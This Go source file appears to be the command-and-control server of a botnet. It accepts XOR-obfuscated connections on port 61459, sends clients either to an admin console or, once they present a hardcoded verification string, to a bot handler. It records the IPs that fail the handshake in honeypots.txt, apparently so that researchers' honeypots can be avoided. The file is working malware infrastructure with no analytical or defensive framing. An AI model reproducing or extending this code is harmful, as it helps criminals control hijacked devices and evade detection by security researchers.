package main

import (
    "fmt"
    "io"
    "net"
    "errors"
    "time"
    "os"
    "sync"
    "bufio"
)

var clientList *ClientList
var database *Database

// File and mutex for thread-safe logging
var logFile *os.File
var logMutex sync.Mutex

func init() {
    // Open or create honeypots.txt in read-write mode
    var err error
    logFile, err = os.OpenFile("honeypots.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644)
    if err != nil {
        fmt.Printf("Failed to open honeypots.txt: %v\n", err)
        return
    }
}

func main() {
    clientList = NewClientList()
    database = NewDatabase("db3.json")

    // Start the duplicate cleanup loop after both clientList and database are initialized
    go clientList.startDuplicateCleanup()

    go StartAPIServer()
    tel, err := net.Listen("tcp", "0.0.0.0:61459")
    if err != nil {
        fmt.Println(err)
        return
    }
    defer logFile.Close() // Ensure file is closed when main exits

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("ERROR: run ulimit -n 999999")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    // Read encrypted header (4 bytes)
    header := make([]byte, 4)
    _, err := io.ReadFull(conn, header)
    if err != nil {
        return
    }
    xorCrypt(header) // decrypt header
    if header[0] != 0x00 || header[1] != 0x00 || header[2] != 0x00 {
        NewAdmin(conn).Handle()
        return
    }
    version := header[3]

    // Read encrypted id_len (1 byte)
    idLenBuf := make([]byte, 1)
    _, err = io.ReadFull(conn, idLenBuf)
    if err != nil {
        return
    }
    xorCrypt(idLenBuf) // decrypt id_len
    idLen := idLenBuf[0]

    // Read encrypted id (idLen bytes)
    var source string
    if idLen > 0 {
        idBuf := make([]byte, idLen)
        _, err = io.ReadFull(conn, idBuf)
        if err != nil {
            return
        }
        xorCrypt(idBuf) // decrypt id
        source = string(idBuf)
    } else {
        source = "unknown"
    }

    // Read encrypted verif_len (1 byte)
    verifLenBuf := make([]byte, 1)
    _, err = io.ReadFull(conn, verifLenBuf)
    if err != nil {
        return
    }
    xorCrypt(verifLenBuf) // decrypt verif_len
    verifLen := verifLenBuf[0]

    // Read encrypted verif_str (verifLen bytes)
    verifBuf := make([]byte, verifLen)
    _, err = io.ReadFull(conn, verifBuf)
    if err != nil {
        return
    }
    xorCrypt(verifBuf) // decrypt verif_str
    if string(verifBuf) != "SkPytrYdGuTSzCxiBM0xpNvwoKQcSr7d" {
        logFailedIP(conn)
        return
    }

    // Verification successful
    conn.SetDeadline(time.Time{})
    NewBot(conn, version, source).Handle()
}

// Log unique IP address to honeypots.txt
func logFailedIP(conn net.Conn) {
    // Get IP address from RemoteAddr
    ipAddr := conn.RemoteAddr().(*net.TCPAddr).IP.String()

    // Thread-safe operation
    logMutex.Lock()
    defer logMutex.Unlock()

    // Check if IP already exists
    exists, err := ipExists(ipAddr)
    if err != nil {
        fmt.Printf("Failed to check IP in honeypots.txt: %v\n", err)
        return
    }
    if exists {
        return // IP already logged, skip writing
    }

    // Write raw IP to file
    logEntry := ipAddr + "\n"
    if _, err := logFile.WriteString(logEntry); err != nil {
        fmt.Printf("Failed to write to honeypots.txt: %v\n", err)
        return
    }
    // Ensure data is written to disk
    logFile.Sync()
}

// Check if an IP already exists in honeypots.txt
func ipExists(ip string) (bool, error) {
    // Reset file pointer to start
    if _, err := logFile.Seek(0, 0); err != nil {
        return false, err
    }

    scanner := bufio.NewScanner(logFile)
    for scanner.Scan() {
        if scanner.Text() == ip {
            return true, nil
        }
    }
    return false, scanner.Err()
}

// Existing functions remain unchanged
func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0
    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }
    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
